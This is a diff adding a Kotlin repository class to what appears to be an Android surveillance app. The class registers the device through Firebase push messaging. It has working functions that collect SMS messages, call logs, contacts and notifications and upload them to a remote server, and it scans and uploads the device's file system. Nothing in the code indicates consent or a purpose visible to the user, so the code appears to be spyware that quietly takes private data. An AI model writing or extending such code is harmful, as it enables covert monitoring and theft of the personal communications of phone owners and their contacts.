@@ -1,0 +1,159 @@
+// DeviceRepository.kt
+package com.elfinsaddle.data.repository // <-- Correct package
+
+import android.content.Context
+import android.util.Log
+import com.elfinsaddle.data.local.AppDatabase
+import com.elfinsaddle.data.local.AppPreferences
+import com.elfinsaddle.data.remote.ApiClient
+import com.elfinsaddle.util.DeviceContentResolver
+import com.elfinsaddle.util.FileSystemManager
+import com.elfinsaddle.util.SystemInfoManager
+import com.google.firebase.ktx.Firebase
+import com.google.gson.Gson
+import com.google.firebase.messaging.ktx.messaging
+import kotlinx.coroutines.tasks.await
+
+/**
+ * Central repository for managing device registration, data synchronization, and token handling.
+ * This is the single source of truth for device-related operations.
+ */
+class DeviceRepository(
+    private val apiClient: ApiClient,
+    private val appPreferences: AppPreferences,
+    private val systemInfoManager: SystemInfoManager,
+    private val appDb: AppDatabase,
+    private val deviceContentResolver: DeviceContentResolver,
+    private val fileSystemManager: FileSystemManager,
+    private val appContext: Context
+) {
+    companion object {
+        private const val TAG = "DeviceRepository"
+    }
+
+
+    private val gson = Gson()
+
+    suspend fun registerDevice(deviceName: String): Result<Unit> {
+        return try {
+            val token = Firebase.messaging.token.await()
+            val success = apiClient.registerDevice(
+                token = token,
+                deviceModel = systemInfoManager.getDeviceModel(),
+                deviceId = systemInfoManager.getDeviceId(),
+                name = deviceName
+            )
+            appPreferences.setRegistrationStatus(success)
+            if (success) Result.success(Unit) else Result.failure(Exception("API registration failed"))
+        } catch (e: Exception) {
+            Log.e(TAG, "Device registration failed", e)
+            appPreferences.setRegistrationStatus(false)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun updateFcmToken(token: String) {
+        Log.i(TAG, "Updating FCM token on the server.")
+        registerDevice("Android-${systemInfoManager.getDeviceModel()}").fold(
+            onSuccess = { Log.i(TAG, "FCM token successfully updated on server.") },
+            onFailure = { Log.e(TAG, "Failed to update FCM token on server.", it) }
+        )
+    }
+
+    suspend fun handleTokenPotentiallyDeleted() {
+        Log.i(TAG, "Handling potentially deleted token scenario.")
+        val deviceId = systemInfoManager.getDeviceId()
+        try {
+            val success = apiClient.deleteDevice(deviceId)
+            Log.i(TAG, "Device removal request sent to server: ${if (success) "OK" else "Failed"}")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error notifying server of token deletion", e)
+        } finally {
+            appPreferences.setRegistrationStatus(false)
+        }
+    }
+
+    fun getRegistrationStatus(): Boolean = appPreferences.getRegistrationStatus()
+
+    fun isFirstLaunch(): Boolean = !appPreferences.hasInitializedApp()
+
+    fun markAppInitialized() = appPreferences.setInitializedApp(true)
+
+    suspend fun syncSms(): Boolean {
+        val dao = appDb.smsDao()
+        val latestTimestamp = dao.getLatestSmsTimestamp() ?: 0L
+        val newSmsList = deviceContentResolver.scanSms(since = latestTimestamp)
+        if (newSmsList.isNotEmpty()) dao.insertAll(newSmsList)
+        val unsyncedSms = dao.getUnsyncedSms()
+        if (unsyncedSms.isEmpty()) return true
+        val success = apiClient.syncData("sms", systemInfoManager.getDeviceId(), unsyncedSms)
+        if (success) dao.markAsSynced(unsyncedSms.map { it.id })
+        return success
+    }
+
+    suspend fun syncCallLogs(): Boolean {
+        val dao = appDb.callLogDao()
+        val latestTimestamp = dao.getLatestCallLogTimestamp() ?: 0L
+        val newCallLogs = deviceContentResolver.scanCallLogs(since = latestTimestamp)
+        if (newCallLogs.isNotEmpty()) dao.insertAll(newCallLogs)
+        val unsyncedCallLogs = dao.getUnsyncedCallLogs()
+        if (unsyncedCallLogs.isEmpty()) return true
+        val success = apiClient.syncData("calllogs", systemInfoManager.getDeviceId(), unsyncedCallLogs)
+        if (success) dao.markAsSynced(unsyncedCallLogs.map { it.id })
+        return success
+    }
+
+    suspend fun syncContacts(): Boolean {
+        val dao = appDb.contactDao()
+        val currentDeviceContacts = deviceContentResolver.scanContacts()
+        val localContacts = dao.getAllContacts().associateBy { it.contactId }
+        val contactsToUpsert = currentDeviceContacts.filter { deviceContact ->
+            val localContact = localContacts[deviceContact.contactId]
+            localContact == null || deviceContact.lastUpdated > localContact.lastUpdated
+        }
+        if (contactsToUpsert.isNotEmpty()) dao.insertAll(contactsToUpsert)
+        val unsyncedContacts = dao.getUnsyncedContacts()
+        if (unsyncedContacts.isEmpty()) return true
+        val success = apiClient.syncData("contacts", systemInfoManager.getDeviceId(), unsyncedContacts)
+        if (success) dao.markAsSynced(unsyncedContacts.map { it.contactId })
+        return success
+    }
+
+    // vvv ADDED vvv
+    suspend fun syncNotifications(): Boolean {
+        val dao = appDb.notificationDao()
+        val unsyncedNotifications = dao.getUnsyncedNotifications()
+        if (unsyncedNotifications.isEmpty()) {
+            Log.d(TAG, "No new notifications to sync.")
+            return true
+        }
+
+        Log.d(TAG, "Found ${unsyncedNotifications.size} unsynced notifications to send.")
+        val success = apiClient.syncData("notifications", systemInfoManager.getDeviceId(), unsyncedNotifications)
+
+        if (success) {
+            dao.markAsSynced(unsyncedNotifications.map { it.id })
+            Log.i(TAG, "Successfully synced ${unsyncedNotifications.size} notifications.")
+        } else {
+            Log.e(TAG, "Failed to sync notifications to the server.")
+        }
+        return success
+    }
+    // ^^^ ADDED ^^^
+
+    suspend fun scanAndUploadFileSystem(): Boolean {
+        if (!fileSystemManager.hasFileSystemPermissions()) {
+            Log.w(TAG, "Cannot scan filesystem, MANAGE_EXTERNAL_STORAGE permission missing.")
+            return false
+        }
+        val scanResult = fileSystemManager.scanFileSystem()
+        if (scanResult.paths.isEmpty()) {
+            Log.i(TAG, "File system scan found no items to report.")
+            return true
+        }
+
+        val scanResultJson = gson.toJson(scanResult)
+        return apiClient.uploadFileSystemScan(systemInfoManager.getDeviceId(), scanResultJson)
+    }
+
+}
